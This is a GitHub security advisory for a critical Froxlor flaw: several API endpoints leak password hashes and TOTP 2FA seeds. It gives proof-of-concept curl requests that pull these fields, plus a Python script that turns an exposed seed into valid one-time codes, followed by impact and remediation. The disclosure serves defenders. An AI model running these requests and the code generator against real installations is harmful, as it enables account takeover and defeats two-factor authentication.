# [C] Froxlor: Credential and 2FA secret disclosure via Froxlor API endpoints

## Summary
Severity: Critical
Advisory: GHSA-7788-ghfq-c6mh
CVE: CVE-2026-62988
CWE: CWE-200
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-7788-ghfq-c6mh
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.8

## Details
## Summary

Several Froxlor API command classes return sensitive authentication material in JSON API responses. The affected endpoints retrieve full database rows using `SELECT *`, `SELECT alias.*`, or equivalent full-row queries, then return the results directly through `$this->response(...)` without removing credential-related fields.

The exposed fields include password hashes for customers, administrators, and FTP users, as well as TOTP 2FA seed material for administrator and customer accounts.

This exposes credential-equivalent data to API clients that should not receive it. Password hashes can be cracked offline and reused for account takeover, while exposed TOTP seeds allow generation of valid 2FA codes for affected accounts. When both a password hash and TOTP seed are exposed for the same account, the vulnerability can defeat both authentication factors if the password hash is cracked or the password is otherwise obtained.

## Details

The affected API classes retrieve entire database rows and return them without filtering sensitive fields:

### `lib/Froxlor/Api/Commands/Customers.php`

`Customers.get()` and `Customers.listing()` select and return customer rows containing sensitive fields, including:

* `password`
* `type_2fa`
* `data_2fa`

When `type_2fa = 2`, the `data_2fa` value represents the Base32-encoded TOTP seed used by the customer's authenticator application.

The result is returned through `$this->response($result)` or `$this->response(['list' => $result])` without removing these fields.

### `lib/Froxlor/Api/Commands/Admins.php`

`Admins.get()` and `Admins.listing()` return administrator rows containing sensitive fields, including:

* `password`
* `type_2fa`
* `data_2fa`

When `type_2fa = 2`, the `data_2fa` value represents the Base32-encoded TOTP seed used by the administrator's authenticator application.

These fields are not stripped before returning the API response.

### `lib/Froxlor/Api/Commands/Ftps.php`

`Ftps.get()` and `Ftps.listing()` return FTP user rows containing:

* `password`

The password field is not stripped before returning the API response.

This behavior appears inconsistent with Froxlor's existing safe response patterns. For example, other API command classes explicitly remove password-related fields before returning responses. This indicates that credential material and sensitive internal fields are already treated as non-response data in other parts of the product.

## Proof of Concept

### Preconditions

* Froxlor API is enabled.
* A valid API key and secret exist for an account allowed to call the affected API endpoints.
* At least one customer or administrator account exists with TOTP 2FA enabled.
* For `Admins.*`, the API account must have the required permission to call the affected administrator endpoint.

Set variables:

```bash
export FROXLOR_BASE='https://froxlor.example.com'
export API_KEY='<api_key>'
export API_SECRET='<api_secret>'
```

### PoC 1: Customer password hash and TOTP seed exposure

```bash
curl -k -sS -u "$API_KEY:$API_SECRET" \
  -H 'Content-Type: application/json' \
  -X POST \
  -d '{"command":"Customers.listing","params":{}}' \
  "$FROXLOR_BASE/api.php" | jq '.data.list[] | {customerid, loginname, password, type_2fa, data_2fa, email}'
```

Example vulnerable response:

```json
{
  "customerid": 1,
  "loginname": "customer1",
  "password": "$2y$12$REDACTED_HASH_VALUE...",
  "type_2fa": 2,
  "data_2fa": "REDACTED_BASE32_TOTP_SEED",
  "email": "customer@example.com"
}
```

The same issue can be verified with `Customers.get`:

```bash
curl -k -sS -u "$API_KEY:$API_SECRET" \
  -H 'Content-Type: application/json' \
  -X POST \
  -d '{"command":"Customers.get","params":{"id":1}}' \
  "$FROXLOR_BASE/api.php"
```

### PoC 2: Administrator password hash and TOTP seed exposure

```bash
curl -k -sS -u "$API_KEY:$API_SECRET" \
  -H 'Content-Type: application/json' \
  -X POST \
  -d '{"command":"Admins.listing","params":{}}' \
  "$FROXLOR_BASE/api.php" | jq '.data.list[] | {adminid, loginname, password, type_2fa, data_2fa}'
```

Example vulnerable response:

```json
{
  "adminid": 1,
  "loginname": "admin",
  "password": "$2y$12$REDACTED_HASH_VALUE...",
  "type_2fa": 2,
  "data_2fa": "REDACTED_BASE32_TOTP_SEED"
}
```

The same issue can be verified with `Admins.get`:

```bash
curl -k -sS -u "$API_KEY:$API_SECRET" \
  -H 'Content-Type: application/json' \
  -X POST \
  -d '{"command":"Admins.get","params":{"id":1}}' \
  "$FROXLOR_BASE/api.php"
```

### PoC 3: FTP password hash exposure

```bash
curl -k -sS -u "$API_KEY:$API_SECRET" \
  -H 'Content-Type: application/json' \
  -X POST \
  -d '{"command":"Ftps.listing","params":{}}' \
  "$FROXLOR_BASE/api.php" | jq '.data.list[] | {id, username, password}'
```

Example vulnerable response:

```json
{
  "id": 1,
  "username": "customer1",
  "password": "$2y$12$REDACTED_HASH_VALUE..."
}
```

The same issue can be verified with `Ftps.get`:

```bash
curl -k -sS -u "$API_KEY:$API_SECRET" \
  -H 'Content-Type: application/json' \
  -X POST \
  -d '{"command":"Ftps.get","params":{"id":1}}' \
  "$FROXLOR_BASE/api.php"
```

### PoC 4: Generate a valid TOTP code from the exposed seed

If `type_2fa = 2`, the exposed `data_2fa` value can be used to generate valid TOTP codes for the affected account.

```bash
export TOTP_SEED='<base32_totp_seed_from_data_2fa>'

python3 - <<'PY'
import base64
import hashlib
import hmac
import os
import struct
import time

seed = os.environ["TOTP_SEED"].replace(" ", "").upper()
key = base64.b32decode(seed + "=" * ((8 - len(seed) % 8) % 8))

counter = int(time.time() // 30)
msg = struct.pack(">Q", counter)

digest = hmac.new(key, msg, hashlib.sha1).digest()
offset = digest[-1] & 0x0F
code = struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7fffffff

print(str(code % 1000000).zfill(6))
PY
```

The generated six-digit value is a valid TOTP code for the affected account during the current TOTP time window.

### Expected behavior

API responses should never include password hashes, TOTP seeds, or other credential-equivalent authentication material in normal `get` or `listing` responses.

At minimum, the following fields should be omitted or redacted before returning API responses:

* `password`
* `data_2fa`
* any future credential-equivalent secret fields

## Impact

An authenticated API user can retrieve credential material for accounts visible through the affected endpoints.

For password hashes, an attacker can perform offline cracking. If a weak or reused password is recovered, the attacker can authenticate as the affected customer, administrator, or FTP user. This may lead to unauthorized access to the hosting panel, FTP file access, hosted website modification, mail or database management, and lateral movement inside a shared-hosting environment.

For TOTP 2FA seeds, an attacker can generate valid one-time codes for affected administrator or customer accounts. TOTP seeds are long-lived secrets and remain valid until 2FA is reset. Exposure of `data_2fa` therefore weakens or bypasses the second authentication factor for affected accounts.

The combined impact is especially severe when both `password` and `data_2fa` are exposed for the same administrator or customer account. In that case, an attacker can attempt to crack the password hash offline and then use the exposed TOTP seed to generate valid 2FA codes, defeating both factors of authentication.

Administrator credential material is particularly sensitive because compromise of an administrator account may allow privileged panel actions and access to server-level or customer-level hosting configuration. Customer and FTP credential material is also sensitive because it may allow unauthorized access to hosted content and account-specific resources.

## Remediation

API responses should be built from explicit allowlists of safe response fields instead of returning full database rows. Sensitive fields such as `password` and `data_2fa` should never be included in normal `get` or `listing` responses.

As a tactical fix, remove or redact credential-equivalent fields before calling `$this->response(...)` in the affected API command classes.

As an architectural fix, introduce centralized response serialization for API models so that sensitive fields are consistently excluded across all endpoints. This should include password hashes, TOTP seeds, recovery secrets, API secrets, tokens, private keys, and any future authentication material.

Because TOTP seeds may have been exposed, affected installations should consider requiring 2FA reset or rotation for accounts whose `data_2fa` values may have been returned through vulnerable API responses.

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-7788-ghfq-c6mh
- https://github.com/froxlor/froxlor/commit/52a43fb826bb9a058faf9c39feeef7ac4444ceba
- https://github.com/froxlor/froxlor/commit/8667fa3a4d77d6e322b7b8f7b9edbc1613ab5797
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.8
